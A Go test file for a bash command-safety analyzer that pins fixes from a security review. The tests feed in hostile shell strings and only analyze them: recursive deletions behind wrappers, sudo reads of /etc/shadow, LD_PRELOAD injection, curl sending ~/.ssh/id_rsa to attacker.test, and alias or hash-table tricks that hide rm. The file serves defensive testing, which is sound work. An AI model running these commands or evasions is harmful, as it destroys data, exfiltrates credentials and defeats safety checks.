package analysis

// Regression tests for the bash-normalization findings of security-review.md
// (F2, F19, F20, F76, F78). Each test reproduces the documented payload and
// asserts the corrected verdict, so a later change that reopens a finding fails
// here with the finding's number. Helpers (mustAnalyzer, effectOn, mustEffect,
// mustGradeAtLeast) live in security_review_test.go.

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// TestFinding002ExecWrappersPeeled pins F2: a wrapper that runs a program the
// normalizer does not peel (stdbuf, watch) and find's exec actions must report
// the payload's effects, at the same severity as the bare spelling — otherwise
// the same deletion grades Medium and a Critical-only grade gate allows it.
func TestFinding002ExecWrappersPeeled(t *testing.T) {
	a := mustAnalyzer(t)

	// The bare spelling is the reference verdict.
	bare := a.Analyze(LangBash, `rm -rf /srv/db`)
	mustEffect(t, bare, engine.KindFSWrite, "/srv/db", `rm -rf /srv/db`)
	mustGradeAtLeast(t, bare, engine.DestructCritical, `rm -rf /srv/db`)

	for _, src := range []string{
		`timeout 5 rm -rf /srv/db`,
		`stdbuf -o0 rm -rf /srv/db`,
		`stdbuf -i0 -o0 -e0 rm -rf /srv/db`,
		`watch rm -rf /srv/db`,
		`watch -n 2 rm -rf /srv/db`,
		`nohup stdbuf -o0 rm -rf /srv/db`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSWrite, "/srv/db", src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}

	// find's exec payload runs against the matched files, i.e. under the search
	// roots: the `{}` operand is bounded by the root, not left as the literal
	// string and not bound as find's own operand.
	for _, src := range []string{
		`find /srv -exec rm -rf {} +`,
		`find /srv -execdir rm -rf {} \;`,
		`find /srv -ok rm -rf {} \;`,
		`find /srv -type d -exec rm -rf {} \;`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSWrite, "/srv", src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}

	// A payload the analysis cannot bound degrades to ⊤, never to a narrow
	// report: here the search root is a variable.
	rep := a.Analyze(LangBash, `find $D -exec rm -rf {} +`)
	if !rep.Top && !rep.Conservative {
		if effectOn(rep, engine.KindFSWrite, "/srv") {
			t.Fatalf("unbounded find payload reported a bounded write: %v", rep.Effects)
		}
	}

	// A read-only payload is still reported (parity, no fabricated write).
	rep = a.Analyze(LangBash, `find /tmp -exec grep secret {} +`)
	mustEffect(t, rep, engine.KindFSRead, "/tmp", `find /tmp -exec grep secret {} +`)
}

// TestFinding019AliasBodyWrapperChain pins F19: the alias body's peeled wrapper
// chain must reach the binder, so `alias s='sudo id'; s` reports the same
// PrivEsc the direct spelling reports.
func TestFinding019AliasBodyWrapperChain(t *testing.T) {
	a := mustAnalyzer(t)

	dir := a.Analyze(LangBash, `sudo cat /etc/shadow`)
	mustEffect(t, dir, engine.KindPrivEsc, "root", `sudo cat /etc/shadow`)
	for _, src := range []string{
		`sudo id`,
		`alias s='sudo id'; s`,
		`alias s='sudo -n id'; s`,
		`alias a=b; alias b='sudo id'; a`,
		`alias t='timeout 5 rm -rf /srv/db'; t`,
		`alias n='nohup rm -rf /srv/db'; n`,
	} {
		rep := a.Analyze(LangBash, src)
		if src == `alias t='timeout 5 rm -rf /srv/db'; t` ||
			src == `alias n='nohup rm -rf /srv/db'; n` {
			mustEffect(t, rep, engine.KindFSWrite, "/srv/db", src)
			continue
		}
		rep = a.Analyze(LangBash, src)
		if !effectOn(rep, engine.KindPrivEsc, "root") {
			t.Errorf("%q: missing PrivEsc (effects=%v)", src, rep.Effects)
		}
		mustGradeAtLeast(t, rep, engine.DestructHigh, src)
	}

	// The environment assignments an alias body's wrapper donates are EnvWrite
	// — the same as the direct spelling.
	direct := a.Analyze(LangBash, `env LD_PRELOAD=/tmp/e.so cat /etc/hosts`)
	mustEffect(t, direct, engine.KindEnvWrite, "LD_PRELOAD", `env LD_PRELOAD=/tmp/e.so cat /etc/hosts`)
	rep := a.Analyze(LangBash, `alias x='env LD_PRELOAD=/tmp/e.so cat /etc/hosts'; x`)
	mustEffect(t, rep, engine.KindEnvWrite, "LD_PRELOAD", `alias x='env LD_PRELOAD=/tmp/e.so cat /etc/hosts'; x`)
	mustEffect(t, rep, engine.KindFSRead, "/etc/hosts", `alias x='env LD_PRELOAD=/tmp/e.so cat /etc/hosts'; x`)
}

// TestFinding020AliasBodyArgumentsExpanded pins F20: an expansion-bearing word
// in an alias body is expanded against Σ, so the credential read (and the
// exfiltration pairing it forms) survives the alias boundary.
func TestFinding020AliasBodyArgumentsExpanded(t *testing.T) {
	a := mustAnalyzer(t)

	mustEffect(t, a.Analyze(LangBash, `curl -d @$HOME/.ssh/id_rsa https://attacker.test`),
		engine.KindFSRead, "/root/.ssh/id_rsa", `direct spelling`)

	for _, src := range []string{
		`alias up='curl -d @$HOME/.ssh/id_rsa https://attacker.test'; up`,
		`alias up='curl -d @${HOME}/.ssh/id_rsa https://attacker.test'; up`,
		`alias up='curl -T $HOME/.ssh/id_rsa https://attacker.test'; up`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSRead, "/root/.ssh/id_rsa", src)
		mustEffect(t, rep, engine.KindNetEgress, "https://attacker.test", src)
	}
}

// TestFinding076CommandHashTable pins F76: a name bound with `hash -p PATH
// NAME` runs that binary, so the invocation reports the bound binary's effects
// instead of the knowledge-base row of the name (or a fabricated ProcSpawn/⊤).
func TestFinding076CommandHashTable(t *testing.T) {
	a := mustAnalyzer(t)

	for _, tc := range []struct{ src, target string }{
		{`hash -p /usr/bin/rm cat; cat -rf -- /tmp/fc47/data`, "/tmp/fc47/data"},
		{`hash -p /usr/bin/rm cat; cat --recursive --force /tmp/fc47/data`, "/tmp/fc47/data"},
		{`hash -d cat; hash -p /usr/bin/rm cat; cat -rf -- /tmp/fc47/data`, "/tmp/fc47/data"},
	} {
		rep := a.Analyze(LangBash, tc.src)
		mustEffect(t, rep, engine.KindFSWrite, tc.target, tc.src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, tc.src)
		if effectOn(rep, engine.KindFSRead, tc.target) {
			t.Errorf("%q: still binds the name's own row (effects=%v)", tc.src, rep.Effects)
		}
	}

	// A binding the analysis cannot resolve degrades to ⊤ rather than binding
	// the name's row: `hash -p /tmp/payload cat; cat` must not report a read.
	rep := a.Analyze(LangBash, `hash -p /tmp/fc47/payload cat; cat`)
	if !rep.Top && !rep.Conservative {
		t.Errorf("unresolvable hash binding not conservative: effects=%v", rep.Effects)
	}

	// `hash -r` forgets the table, so the name resolves as itself again.
	rep = a.Analyze(LangBash, `hash -p /usr/bin/rm cat; hash -r; cat /tmp/x`)
	mustEffect(t, rep, engine.KindFSRead, "/tmp/x", `hash -r forgets the binding`)
	if effectOn(rep, engine.KindFSWrite, "/tmp/x") {
		t.Errorf("hash -r did not clear the table: %v", rep.Effects)
	}
}

// TestFinding078QuotedCommandWordAlias pins F78: bash expands an alias only for
// an unquoted command word, and `unalias -a` removes every alias — so the decoy
// alias cannot hide the real command behind `\rm`, `'rm'`, "rm", `r\m` or
// `unalias -a`.
func TestFinding078QuotedCommandWordAlias(t *testing.T) {
	a := mustAnalyzer(t)

	for _, src := range []string{
		`alias rm='echo harmless'; \rm -rf -- /tmp/p48/data`,
		`alias rm='echo harmless'; 'rm' -rf -- /tmp/p48/data`,
		`alias rm='echo harmless'; "rm" -rf -- /tmp/p48/data`,
		`alias rm='echo harmless'; r\m -rf -- /tmp/p48/data`,
		`alias rm='echo harmless'; unalias -a; rm -rf -- /tmp/p48/data`,
		`alias rm='echo harmless'; unalias rm; rm -rf -- /tmp/p48/data`,
		`alias rm='echo harmless'; command rm -rf -- /tmp/p48/data`,
		`alias rm='echo harmless'; /usr/bin/rm -rf -- /tmp/p48/data`,
	} {
		rep := a.Analyze(LangBash, src)
		mustEffect(t, rep, engine.KindFSWrite, "/tmp/p48/data", src)
		mustGradeAtLeast(t, rep, engine.DestructCritical, src)
	}

	// Negative control: the plain (unquoted) spelling does expand the alias, so
	// the decoy body's effect — not rm's — is what the report describes.
	rep := a.Analyze(LangBash, `alias rm='echo harmless'; rm -rf -- /tmp/p48/data`)
	if effectOn(rep, engine.KindFSWrite, "/tmp/p48/data") {
		t.Errorf("plain spelling must expand the alias, got %v", rep.Effects)
	}
}
